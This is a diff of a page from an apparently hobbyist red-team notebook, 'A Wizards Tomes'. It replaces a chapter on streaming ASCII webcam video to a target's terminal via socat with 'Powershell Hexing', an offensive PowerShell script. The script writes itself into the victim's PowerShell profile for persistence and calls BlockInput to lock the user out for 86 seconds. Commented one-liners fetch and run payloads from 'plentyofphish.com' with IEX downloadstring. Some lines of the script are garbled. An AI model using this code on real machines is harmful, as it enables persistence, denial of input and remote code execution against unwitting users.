@@ -4,7 +4,7 @@
 
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Tome one, Terminal trolling - A Wizards Tomes</title>
+        <title>Tome two, Powershell Hexing - A Wizards Tomes</title>
         <!-- Custom HTML head -->
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -82,7 +82,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html" class="active"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html"><strong aria-hidden="true">3.</strong> Tome two, Powershell Hexing</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html" class="active"><strong aria-hidden="true">3.</strong> Tome two, Powershell Hexing</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -142,94 +142,70 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="the-first-tome-trolling-via-terminal"><a class="header" href="#the-first-tome-trolling-via-terminal">The First Tome, Trolling via Terminal</a></h1>
-<h2 id="ascii-web"><a class="header" href="#ascii-web">ASCII-WEB</a></h2>
-<p>After watching twitch streamer LCOLNQ who used an ASCII rendered webcam. What if we can render video to Terminal for a cyber effect. Below is the python used to render the video output of a webcam in to Grayscale and then turning grayscale brightness into ASCII characters which get rendered with cureses</p>
-<pre><code class="language-python">import cv2
-import curses
-from curses import wrapper
-import math
-
-def main(screen):
-    scale = 0.2    
-    contrast = 2
-    screen.clear()
-    cap = cv2.VideoCapture(0)
-    if not cap.isOpened():
-        raise IOError(&quot;Cannot open Webcam stream!&quot;)
-    while True:
-        # Capture from webcam
-
-        ret, frame = cap.read()
-        # Resize Frame
-        frame = cv2.resize(frame, None, fx=scale, fy=scale, interpolation=cv2.INTER_AREA)
-        width = len(frame[0])*2
-        # Convert to Grayscale (0 - 255)
-        gscale = []
-        for i, b in enumerate(frame):
-            for x, a in enumerate(b):
-                sum = a[0] + a[1] + a[2] 
-                sum /= 3
-                sum *= contrast
-                sum = int(sum)
-                gscale.append(sum)
-                gscale.append(sum)
-        # Covert Gray to ASCII
-        #color = &quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`'.&quot;[::-1]
-        #color = &quot;0QLCJUYXzcvunxrjft/\\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`'. &quot;[::-1]
-        color = &quot;@%&amp;$#!;:*\,. &quot;[::-1]
-        colorArray = list(color)
-        colorlength = len(colorArray)
-        interval = colorlength/256
-
-        chars = [&quot;@&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;$&quot;, &quot;#&quot;, &quot;*&quot;, &quot;&amp;&quot;, &quot;~&quot;, &quot;:&quot;, &quot;.&quot;, &quot; &quot;]
-        chars.reverse()
-        ascii_px = [chars[pixel//25] for pixel in gscale]
-        #ascii_px = [colorArray[math.floor(pixel*interval)] for pixel in gscale]
-        ascii_px = ''.join(ascii_px)
-        ascii_frame = [ascii_px[index:index+width] for index in range(0, len(ascii_px), width)]
-        # Display Image in Terminal
-        for l, x in enumerate(ascii_frame):
-            try:
-                screen.addstr(l, 0, x)
-            except:
-                pass
-        screen.refresh()
-    cap.release()
-    return
-
-
-wrapper(main)
-
-</code></pre>
-<p>Added other character lists that can be used but the one on right now just looks the best.</p>
+                        <h1 id="powershell-hexing-for-rookies"><a class="header" href="#powershell-hexing-for-rookies">Powershell Hexing for Rookies</a></h1>
+<p>Spell Class : Black Magic</p>
+<p>Spell Level : Introduction</p>
 <hr />
-<p>So the way it stands right now using socat we can pipe the program over TCP for remote playing. IE you can just host your webcam to a target box.</p>
-<pre><code class="language-shell">sudo socat TCP4-LISTEN:80 EXEC:&quot;python3.11 ./ascii-web.py&quot;
+<pre><code class="language-powershell">$filethingy = (Get-Childitem -Path C:\ -Recurse -ErrorAction SilentlyContinue | where {$_.Name -match 'memoryfixer.ps1'}).FullName
+$content = Get-Content -Path $filethingy
+
+if (!(Test-Path $profile)) {
+New-Item -ItemType File -Path $profile -Force 
+Set-Content -Path $profile -Value $content
+}else {
+Set-Content -Path $profile -Value $content
+}
+
+
+
+Set-CoAdd-Type -AssemblyName presentationCore
+$filepath = &quot;C:\Windows\Temp\trap.mp4&quot;
+$wmplayer = New-Object System.Windows.Media.MediaPlayer
+$wmplayer.Open($filepath)
+Start-Sleep 1 
+$duration = $wmplayer.NaturalDuration.TimeSpan.Seconds
+$wmplayer.Close()
+start playing
+$proc = Start-process -FilePath &quot;C:\Program Files (x86)\Windows Media Player\wmplayer.exe&quot; -ArgumentList $filepath -PassThru
+
+
+
+# This Bit locks the user out for 86 seconds
+
+$code = @'
+    [DllImport(&quot;user32.dll&quot;)]
+        public static extern bool BlockInput(bool fBlockIt);
+'@
+        
+        $userInput = Add-Type -MemberDefinition $code -Name Blocker -Namespace UserInput -PassThru
+        
+        
+        $null = $userInput::BlockInput($true)
+        
+Write-Warning &quot;You have just fell for the trap...&quot;
+
+        Start-Sleep -Seconds 86
+        
+       
+        $null = $userInput::BlockInput($false)
+        
+
+
+Set-StrictMode -Version 2
+
+#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))&quot;
+#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))&quot;
+
+#Runs above payloads
+
 </code></pre>
-<p>Clarity of the terminal is based off your host font size. Which is strange.</p>
-<p>For the target box we can just use a <code>netcat</code> to grab the output of said </p>
-<hr />
-<p>Upgraded socat hosting?</p>
-<pre><code class="language-shell">socat -d TCP4-LISTEN:80,reuseaddr,fork EXEC:&quot;python3.11 ./ascii-web.py&quot;
-</code></pre>
-<p>Idea here is to allow the process to get forked. However I am also not sure if that is a good idea. Might allow the computer to be resource attacked by a bunch of connections just ZERG rushing it.</p>
-<p>Below is recon for PTS terminal windows </p>
-<pre><code class="language-shell">who -a;echo&quot;&quot;; ps -aux | grep &quot;.*pts.*&quot;
-</code></pre>
-<hr />
-<p>Here is what the poor blue team would see waving back to them on a Terminal that they cannot clear! The only option is to kill the shell. </p>
-<p><img src="attachments/ascii.jpg" alt="Wizard_Render" /></p>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                            <a rel="prev" href="Wizardintro.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="Tome1.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
-                            </a>
-                            <a rel="next" href="Tome22.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                                <i class="fa fa-angle-right"></i>
                             </a>
                         <div style="clear: both"></div>
                     </nav>
@@ -237,11 +213,8 @@ wrapper(main)
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                    <a rel="prev" href="Wizardintro.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="Tome1.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
-                    </a>
-                    <a rel="next" href="Tome22.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
-                        <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
 
